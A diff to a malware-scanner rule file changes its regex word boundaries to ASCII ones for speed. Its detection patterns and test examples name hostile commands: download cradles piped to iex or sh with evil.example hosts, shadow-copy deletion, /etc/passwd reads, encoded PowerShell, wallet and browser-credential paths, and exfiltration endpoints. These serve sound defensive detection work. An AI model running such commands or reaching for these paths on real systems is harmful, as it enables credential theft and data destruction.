@@ -3,6 +3,8 @@
 # id        stable identifier; never reuse or renumber (baselines and SARIF key on names, people on ids)
 # category  scoping: exfiltration/file_access = scripts + manifests, install_hook = setup.py, others = all scanned files
 # examples  `matches` / `ignores` are run as tests (cargo test rule_examples)
+# `(?-u:\b)` not `\b`: a Unicode word boundary makes the regex engine fall
+# back to its slowest mode on any non-ASCII byte, i.e. on most bundles (5x).
 
 [[rule]]
 id = "KS-EXF-001"
@@ -36,7 +38,7 @@ name = "Hardcoded IP Address"
 severity = "medium"
 category = "exfiltration"
 description = "Hardcoded IP address — potential C2 server"
-pattern = '''\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'''
+pattern = '''(?-u:\b)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?-u:\b)'''
 
 [[rule]]
 id = "KS-EXF-005"
@@ -45,7 +47,7 @@ severity = "critical"
 category = "exfiltration"
 description = "AWS Access Key ID detected — credential leak"
 # Word boundaries: AKIA-shaped runs inside base64 blobs are not keys.
-pattern = '''\bAKIA[0-9A-Z]{16}\b'''
+pattern = '''(?-u:\b)AKIA[0-9A-Z]{16}(?-u:\b)'''
 matches = ['''AKIA1234567890123456''', '''key = "AKIAQ3EGRZ7MXKXH4L5N"''']
 ignores = ['''fGh0AKIAAAB0AAAAAAAAAKMAa''']
 
@@ -107,7 +109,7 @@ name = "Crypto Wallet Access"
 severity = "critical"
 category = "file_access"
 description = "Crypto wallet access — crypto theft indicator"
-pattern = '''(?i)(?:wallet\.dat|["'\\/]\.(?:bitcoin|electrum)\b|ethereum(?:[\\/]|["'],\s*["'])keystore|exodus\.wallet|Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa|ejbalbakoplchlghecdalmeeeajnimhm)'''
+pattern = '''(?i)(?:wallet\.dat|["'\\/]\.(?:bitcoin|electrum)(?-u:\b)|ethereum(?:[\\/]|["'],\s*["'])keystore|exodus\.wallet|Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa|ejbalbakoplchlghecdalmeeeajnimhm)'''
 matches = ['''path.join(home, ".ethereum", "keystore")''', '''~/.ethereum/keystore''', '''"~/.electrum/wallets"''', '''Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn''']
 ignores = ['''e.g., PhantomJS 1.x''', '''os.path.join("~", ".ethereum", "geth.ipc")''']
 
@@ -117,7 +119,7 @@ name = "Password Manager Access"
 severity = "high"
 category = "file_access"
 description = "Credential file access detected"
-pattern = '''(?i)(?:passwords?\.txt|passwd|credentials\.dat|login\.json|\.npmrc|(?:^|[\\/"'])[.]env\b)'''
+pattern = '''(?i)(?:passwords?\.txt|passwd|credentials\.dat|login\.json|\.npmrc|(?:^|[\\/"'])[.]env(?-u:\b))'''
 matches = ['''fs.readFileSync(home + "/.env")''']
 ignores = ['''const home = process.env.HOME;''', '''vscode_2.env.appRoot''']
 
@@ -129,7 +131,7 @@ name = "Browser Database Access"
 severity = "high"
 category = "file_access"
 description = "Browser database — session/cookie theft"
-pattern = '''(?i:["'/\\](?:Login Data|Web Data|Local State)["'/\\]|cookies\.sqlite|logins\.json|key4\.db)|(?:Network|Default)[\\/]Cookies\b'''
+pattern = '''(?i:["'/\\](?:Login Data|Web Data|Local State)["'/\\]|cookies\.sqlite|logins\.json|key4\.db)|(?:Network|Default)[\\/]Cookies(?-u:\b)'''
 matches = ['''path.join(profile, "Login Data")''', '''Default\Network\Cookies''']
 ignores = ['''var cookies = require('./../helpers/cookies');''', '''U={_canUseCookies:void 0,disableCookies:P}''']
 
@@ -155,7 +157,7 @@ name = "Environment Variable Dump"
 severity = "medium"
 category = "file_access"
 description = "Environment variable access — may contain secrets"
-pattern = '''(?i)(?:os\.environ|process\.env|getenv\b)'''
+pattern = '''(?i)(?:os\.environ|process\.env|getenv(?-u:\b))'''
 
 # Not `obj.eval(`; the regex crate has no look-behind, so the
 # preceding char is part of the match.
@@ -188,7 +190,7 @@ category = "obfuscation"
 description = "Base64 decode + exec/eval chain — obfuscation"
 # Both must be calls, close together: a SQL keyword list ("from_base64 …
 # run") and a license banner used to match across whole minified lines.
-pattern = '''(?i)(?:(?:^|[^.\w$])(?:exec|eval)\s*\([^\n]{0,120}?(?:b64decode|from_base64|atob)\s*\(|(?:b64decode|from_base64|atob)\s*\([^\n]{0,120}?[^.\w$](?:exec|eval)\s*\()'''
+pattern = '''(?im)(?:(?:^|[^.\w$\n])(?:exec|eval)\s*\([^\n]{0,120}?(?:b64decode|from_base64|atob)\s*\(|(?:b64decode|from_base64|atob)\s*\([^\n]{0,120}?[^.\w$](?:exec|eval)\s*\()'''
 matches = ['''exec(base64.b64decode(payload))''', '''eval(atob(s))''', '''code = b64decode(blob); exec(code)''']
 ignores = ['''from_base64 from_days ftp full function general generated get_lock run''', '''atob(h)))}function l(h){return h.split(",").pop()}function c(h,m){var f=r.mapFileCommentRegex.exec(m)''']
 
@@ -233,7 +235,7 @@ category = "obfuscation"
 description = "PowerShell encoded command — obfuscated execution"
 # Bounded gap: `.*` spanned whole minified bundles from any "powershell "
 # to an unrelated "-enc" (Thunder Client).
-pattern = '''(?i)(?:-EncodedCommand\s+[a-zA-Z0-9+/=]{50,}|powershell(?:\.exe)?\s+[^\n]{0,100}?\s-enc\b)'''
+pattern = '''(?i)(?:-EncodedCommand\s+[a-zA-Z0-9+/=]{50,}|powershell(?:\.exe)?\s+[^\n]{0,100}?\s-enc(?-u:\b))'''
 matches = ['''powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA''', '''powershell.exe -nop -w hidden -enc SQBFAFgA''']
 ignores = ['''shell:"powershell "+cmd;var opts=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40];run(a, -enc)''']
 
@@ -320,7 +322,7 @@ name = "Mass File Encryption"
 severity = "medium"
 category = "ransomware"
 description = "File encryption function — potential ransomware"
-pattern = '''(?i)(?:encrypt_file|encrypt_all|cipher\.encrypt|\.encrypt\s*\(|fernet\b.*encrypt)'''
+pattern = '''(?i)(?:encrypt_file|encrypt_all|cipher\.encrypt|\.encrypt\s*\(|fernet(?-u:\b).*encrypt)'''
 
 [[rule]]
 id = "KS-RAN-002"
@@ -330,7 +332,7 @@ category = "ransomware"
 description = "Shadow copy/backup deletion — ransomware indicator"
 # Word boundaries: `bcdedit` turns up inside base64 data URIs (mssql), and
 # "recovery mode" is ordinary SQL Server vocabulary.
-pattern = '''(?i)\b(?:vssadmin|wmic\s+shadowcopy|bcdedit|bootsect|recoveryenabled\s+no)\b'''
+pattern = '''(?i)(?-u:\b)(?:vssadmin|wmic\s+shadowcopy|bcdedit|bootsect|recoveryenabled\s+no)(?-u:\b)'''
 matches = ['''vssadmin delete shadows /all /quiet''', '''bcdedit /set {default} recoveryenabled No''']
 ignores = ['''ALTER DATABASE db SET RECOVERY SIMPLE; -- switch recovery mode''', '''PHN2ZyB3aWR0aDbcdeditMTYi''']
 
@@ -351,7 +353,7 @@ name = "Ransom Note"
 severity = "critical"
 category = "ransomware"
 description = "Ransom note text — ransomware indicator"
-pattern = '''(?i)(?:ransom(?:note|ware)|how_to_decrypt|readme_decrypt|your_files|your_data\b|pay\s+\d+\s+btc)'''
+pattern = '''(?i)(?:ransom(?:note|ware)|how_to_decrypt|readme_decrypt|your_files|your_data(?-u:\b)|pay\s+\d+\s+btc)'''
 
 [[rule]]
 id = "KS-RAN-005"
@@ -359,7 +361,7 @@ name = "Bitcoin Payment Address"
 severity = "high"
 category = "ransomware"
 description = "Bitcoin address — potential ransom payment"
-pattern = '''\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'''
+pattern = '''(?-u:\b)[13][a-km-zA-HJ-NP-Z1-9]{25,34}(?-u:\b)'''
 
 [[rule]]
 id = "KS-SUP-001"
@@ -375,7 +377,7 @@ name = "Local Network Server"
 severity = "medium"
 category = "network"
 description = "Starts a network listener — reachable by other hosts or by web pages via CSRF"
-pattern = '''(?:\bexpress\s*\(\s*\)|\b(?:http|https|net)\.createServer\s*\(|\bHTTPServer\s*\(|socketserver\.TCPServer|\.run\s*\(\s*host\s*=\s*["']0\.0\.0\.0)'''
+pattern = '''(?:(?-u:\b)express\s*\(\s*\)|(?-u:\b)(?:http|https|net)\.createServer\s*\(|(?-u:\b)HTTPServer\s*\(|socketserver\.TCPServer|\.run\s*\(\s*host\s*=\s*["']0\.0\.0\.0)'''
 matches = ['''const app = express();''', '''http.createServer(handler)''']
 
 [[rule]]
@@ -384,7 +386,7 @@ name = "HTTP File Upload Handler"
 severity = "medium"
 category = "network"
 description = "Accepts file uploads over HTTP"
-pattern = '''(?:\bmulter\s*\(|\bformidable\s*\(|\bbusboy\b|\bupload\.(?:single|array|fields)\s*\()'''
+pattern = '''(?:(?-u:\b)multer\s*\(|(?-u:\b)formidable\s*\(|(?-u:\b)busboy(?-u:\b)|(?-u:\b)upload\.(?:single|array|fields)\s*\()'''
 matches = ['''var upload = multer({ dest: tmp });''']
 
 [[rule]]
@@ -393,7 +395,7 @@ name = "Archive Extraction"
 severity = "medium"
 category = "file_write"
 description = "Extracts archive entries to disk"
-pattern = '''(?:\bzip\.files\b|\.entryName\b|\bentry\.fileName\b|\.extractAllTo\s*\(|\.extractall\s*\(|\btarfile\.open\s*\(|\bzipfile\.ZipFile\s*\()'''
+pattern = '''(?:(?-u:\b)zip\.files(?-u:\b)|\.entryName(?-u:\b)|(?-u:\b)entry\.fileName(?-u:\b)|\.extractAllTo\s*\(|\.extractall\s*\(|(?-u:\b)tarfile\.open\s*\(|(?-u:\b)zipfile\.ZipFile\s*\()'''
 matches = ['''for (let filename in zip.files) {''']
 
 [[rule]]
@@ -402,7 +404,7 @@ name = "Remote Script Download"
 severity = "high"
 category = "supply_chain"
 description = "Remote script download — payload delivery"
-pattern = '''(?i)(?:curl\s+-s(?:SL)?\s+https?://|wget\s+-q\s+https?://)\S+\.(?:ps1|sh|bat|py)\b'''
+pattern = '''(?i)(?:curl\s+-s(?:SL)?\s+https?://|wget\s+-q\s+https?://)\S+\.(?:ps1|sh|bat|py)(?-u:\b)'''
 
 [[rule]]
 id = "KS-SUP-003"
@@ -410,7 +412,7 @@ name = "URL Fetch Command"
 severity = "medium"
 category = "supply_chain"
 description = "URL fetching — possible external payload download"
-pattern = '''(?i)(?:Invoke-WebRequest|curl\b|wget\b|fetch\(|axios\.(?:get|post)|request\.get|\bhttps?\.(?:request|get)\s*\(|requests\.(?:get|post|put)\s*\(|urlopen\s*\(|urllib\.request|http\.client|XMLHttpRequest|\bdns\.(?:lookup|resolve\w*)\s*\()'''
+pattern = '''(?i)(?:Invoke-WebRequest|curl(?-u:\b)|wget(?-u:\b)|fetch\(|axios\.(?:get|post)|request\.get|(?-u:\b)https?\.(?:request|get)\s*\(|requests\.(?:get|post|put)\s*\(|urlopen\s*\(|urllib\.request|http\.client|XMLHttpRequest|(?-u:\b)dns\.(?:lookup|resolve\w*)\s*\()'''
 
 [[rule]]
 id = "KS-SUP-004"
@@ -547,7 +549,7 @@ name = "Exfiltration Service Endpoint"
 severity = "high"
 category = "exfiltration"
 description = "Request-capture / tunnel / file-drop service used to receive stolen data"
-pattern = '''(?i)(?:\b(?:webhook\.site|requestcatcher\.com|m\.pipedream\.net|interact\.sh|oast\.(?:pro|live|site|online|fun|me)\b|oast-[a-z]+\.|burpcollaborator\.net|oastify\.com|canarytokens\.com|beeceptor\.com|requestbin\.(?:net|com)|hookbin\.com)|(?:(?:https?|wss?)://|hostname["']?\s*[:=]\s*["'`])(?:[\w-]+\.)*(?:ngrok(?:-free)?\.(?:io|app|dev)|lhr\.life|localhost\.run|serveo\.net|trycloudflare\.com|api\.telegram\.org|transfer\.sh|catbox\.moe|bashupload\.com|filev2\.getsession\.org))'''
+pattern = '''(?i)(?:(?-u:\b)(?:webhook\.site|requestcatcher\.com|m\.pipedream\.net|interact\.sh|oast\.(?:pro|live|site|online|fun|me)(?-u:\b)|oast-[a-z]+\.|burpcollaborator\.net|oastify\.com|canarytokens\.com|beeceptor\.com|requestbin\.(?:net|com)|hookbin\.com)|(?:(?:https?|wss?)://|hostname["']?\s*[:=]\s*["'`])(?:[\w-]+\.)*(?:ngrok(?:-free)?\.(?:io|app|dev)|lhr\.life|localhost\.run|serveo\.net|trycloudflare\.com|api\.telegram\.org|transfer\.sh|catbox\.moe|bashupload\.com|filev2\.getsession\.org))'''
 matches = ['''https://webhook.site/0b1c''', '''https://abc.m.pipedream.net''', '''hostname: `api.telegram.org`,''', '''socket.gethostbyname(f"{d}.abc.oast.fun")''']
 ignores = ['''"nfshost.com","ngrok.io","nh-serv.co.uk"''']
 
@@ -566,7 +568,7 @@ name = "IP Lookup Service"
 severity = "medium"
 category = "recon"
 description = "Public IP lookup — victim fingerprinting"
-pattern = '''(?i)\b(?:api\.ipify\.org|ipinfo\.io|ip-api\.com|icanhazip\.com|ifconfig\.me|checkip\.amazonaws\.com|api\.myip\.com|ipapi\.co)\b'''
+pattern = '''(?i)(?-u:\b)(?:api\.ipify\.org|ipinfo\.io|ip-api\.com|icanhazip\.com|ifconfig\.me|checkip\.amazonaws\.com|api\.myip\.com|ipapi\.co)(?-u:\b)'''
 
 [[rule]]
 id = "KS-REC-002"
@@ -574,7 +576,7 @@ name = "Host Reconnaissance"
 severity = "medium"
 category = "recon"
 description = "Collects host / user identity"
-pattern = '''(?:\bos\.(?:hostname|userInfo|networkInterfaces)\s*\(|getpass\.getuser\s*\(|socket\.gethostname\s*\(|platform\.node\s*\(|os\.getlogin\s*\(|psutil\.net_if_addrs)'''
+pattern = '''(?:(?-u:\b)os\.(?:hostname|userInfo|networkInterfaces)\s*\(|getpass\.getuser\s*\(|socket\.gethostname\s*\(|platform\.node\s*\(|os\.getlogin\s*\(|psutil\.net_if_addrs)'''
 matches = ['''const u = os.userInfo().username''']
 
 [[rule]]
@@ -594,7 +596,7 @@ name = "Shell Process Start"
 severity = "high"
 category = "obfuscation"
 description = "Starts a program or evaluates text from a shell script"
-pattern = '''(?i)(?:\bstart\s+""|\bStart-Process\b|\bInvoke-Expression\b|\biex\s*[\(\$]|\|(?:\s|\\x20)*iex\b|cmd(?:\.exe)?(?:\s|\\x20)+/c(?:\s|\\x20))'''
+pattern = '''(?i)(?:(?-u:\b)start\s+""|(?-u:\b)Start-Process(?-u:\b)|(?-u:\b)Invoke-Expression(?-u:\b)|(?-u:\b)iex\s*[\(\$]|\|(?:\s|\\x20)*iex(?-u:\b)|cmd(?:\.exe)?(?:\s|\\x20)+/c(?:\s|\\x20))'''
 matches = ['''|\x20iex''', '''start "" /B "%EXE%"''']
 
 [[rule]]
@@ -603,7 +605,7 @@ name = "Raw Socket Connection"
 severity = "medium"
 category = "network"
 description = "Opens a raw TCP connection"
-pattern = '''(?:new\s+net\.Socket\s*\(|\bnet\.(?:connect|createConnection)\s*\(|\.connect\(\(\s*["']?\d)'''
+pattern = '''(?:new\s+net\.Socket\s*\(|(?-u:\b)net\.(?:connect|createConnection)\s*\(|\.connect\(\(\s*["']?\d)'''
 
 [[rule]]
 id = "KS-EXE-022"
@@ -611,7 +613,7 @@ name = "Detached Process Spawn"
 severity = "medium"
 category = "obfuscation"
 description = "Starts a process that outlives its parent"
-pattern = '''\bdetached\s*:\s*true'''
+pattern = '''(?-u:\b)detached\s*:\s*true'''
 
 [[rule]]
 id = "KS-EXE-023"
@@ -627,7 +629,7 @@ name = "Obfuscator.io Output"
 severity = "high"
 category = "obfuscation"
 description = "javascript-obfuscator output (_0x string-array decoder)"
-pattern = '''(?:var|const|let|function)\s+_0x[0-9a-f]{4,6}\b'''
+pattern = '''(?:var|const|let|function)\s+_0x[0-9a-f]{4,6}(?-u:\b)'''
 matches = ['''function _0x2470(){return _0x2e306f;}''']
 ignores = ['''var a=0x1f;''']
 
@@ -637,7 +639,7 @@ name = "Wallet Seed / Private Key Handling"
 severity = "medium"
 category = "file_access"
 description = "Handles wallet seed phrases or private keys"
-pattern = '''(?i)\b(?:mnemonic|seed[ _-]?phrase|recovery[ _-]?phrase|private[ _-]?key)\b'''
+pattern = '''(?i)(?-u:\b)(?:mnemonic|seed[ _-]?phrase|recovery[ _-]?phrase|private[ _-]?key)(?-u:\b)'''
 
 [[rule]]
 id = "KS-SUP-009"
@@ -667,18 +669,20 @@ name = "setup.py Payload Decode/Fetch"
 severity = "high"
 category = "install_hook"
 description = "setup.py decodes a payload or opens a connection at pip install"
-pattern = '''(?:b64decode|\bzlib\.decompress|__import__\(\s*['\x22](?:base64|zlib|marshal)|urllib\.request|urlopen\(|requests\.(?:get|post)\s*\(|socket\.socket\s*\()'''
+pattern = '''(?:b64decode|(?-u:\b)zlib\.decompress|__import__\(\s*['\x22](?:base64|zlib|marshal)|urllib\.request|urlopen\(|requests\.(?:get|post)\s*\(|socket\.socket\s*\()'''
 matches = ['''exec(zlib.decompress(base64.b64decode(blob)))''']
 ignores = ['''exec(open('pkg/version.py').read())''']
 
 # No `\b` before the verb: in `\x22irm` the `2` and `i` are both word chars.
+# `\n` excluded and `(?m)`: a match may not begin on the previous line,
+# where a comment used to hide it and shift its line number.
 [[rule]]
 id = "KS-EXE-025"
 name = "Download Cradle (fetch piped to interpreter)"
 severity = "critical"
 category = "obfuscation"
 description = "Fetches a remote script and pipes it straight into an interpreter"
-pattern = '''(?i)(?:^|[^a-z])(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|curl|wget)(?:\s|\\x20)+[^|\n]{0,200}?https?://[^|\n]{0,200}?\|(?:\s|\\x20)*(?:iex|Invoke-Expression|sh|bash|zsh|python3?|node)\b'''
+pattern = '''(?im)(?:^|[^a-z\n])(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|curl|wget)(?:\s|\\x20)+[^|\n]{0,200}?https?://[^|\n]{0,200}?\|(?:\s|\\x20)*(?:iex|Invoke-Expression|sh|bash|zsh|python3?|node)(?-u:\b)'''
 matches = ['''powershell -Command "irm https://evil.example/a | iex"''', '''powershell\x20-Command\x20\x22irm\x20https://e.x/a\x20|\x20iex\x22''', '''curl -fsSL https://get.example.sh | sh''']
 ignores = ['''curl -o out.zip https://example.com/a.zip''']
 
@@ -690,7 +694,7 @@ name = "Function Constructor with require"
 severity = "high"
 category = "obfuscation"
 description = "new Function('require', code): dynamic code execution with module access"
-pattern = '''(?:\bnew\s+Function|\bFunction\.constructor)\s*\(\s*["'`]require["'`]'''
+pattern = '''(?:(?-u:\b)new\s+Function|(?-u:\b)Function\.constructor)\s*\(\s*["'`]require["'`]'''
 matches = ['''const h = new Function.constructor("require", s);''', '''new Function(
   'require', 'module', data.credits)''']
 ignores = ['''new Function("return this")()''']
@@ -702,7 +706,7 @@ name = "Escaped eval Payload"
 severity = "high"
 category = "obfuscation"
 description = "eval/exec/compile of a fully escaped string literal: obfuscated dynamic code"
-pattern = '''\b(?:eval|exec|compile)\s*\(\s*["']\\(?:x[0-9a-fA-F]{2}|[0-7]{3})'''
+pattern = '''(?-u:\b)(?:eval|exec|compile)\s*\(\s*["']\\(?:x[0-9a-fA-F]{2}|[0-7]{3})'''
 matches = ['''_____=eval("\145\x76\x61\x6c")''']
 ignores = ['''eval("1+1")''', '''re.compile("\\d+")''']
 
@@ -723,7 +727,7 @@ name = "Account Enumeration Command"
 severity = "medium"
 category = "recon"
 description = "Enumerates local users, groups or privileges (system discovery reconnaissance)"
-pattern = '''(?i)\b(?:net\s+(?:user|localgroup)\b|whoami\s+/(?:priv|all|groups)\b|cat\s+/etc/(?:passwd|shadow)\b|dscl\s+\.\s+-?list\s+/Users\b)'''
+pattern = '''(?i)(?-u:\b)(?:net\s+(?:user|localgroup)(?-u:\b)|whoami\s+/(?:priv|all|groups)(?-u:\b)|cat\s+/etc/(?:passwd|shadow)(?-u:\b)|dscl\s+\.\s+-?list\s+/Users(?-u:\b))'''
 matches = ['''execSync('whoami /priv')''', '''execSync('cat /etc/passwd')''']
 ignores = ['''path.join(root, '../../etc/passwd')''']
 
@@ -744,7 +748,7 @@ name = "Shell Profile Modification"
 severity = "medium"
 category = "file_write"
 description = "Touches shell startup files (.bashrc / .zshrc / .bash_profile): persistence"
-pattern = '''\.(?:bashrc|zshrc|bash_profile)\b'''
+pattern = '''\.(?:bashrc|zshrc|bash_profile)(?-u:\b)'''
 matches = ['''path.join(homeDir, '.zshrc')''']
 
 [[rule]]
@@ -753,6 +757,6 @@ name = "npm Publish from Code"
 severity = "medium"
 category = "supply_chain"
 description = "Runs `npm publish` from a script (release tooling, or a registry spam publisher)"
-pattern = '''\b(?:exec|execSync|spawn|spawnSync|execa)\s*\(\s*["'`]npm\s+publish\b'''
+pattern = '''(?-u:\b)(?:exec|execSync|spawn|spawnSync|execa)\s*\(\s*["'`]npm\s+publish(?-u:\b)'''
 matches = ['''exec('npm publish --access public', (error) => {''']
 ignores = ['''execa('npm', ['publish'])''']
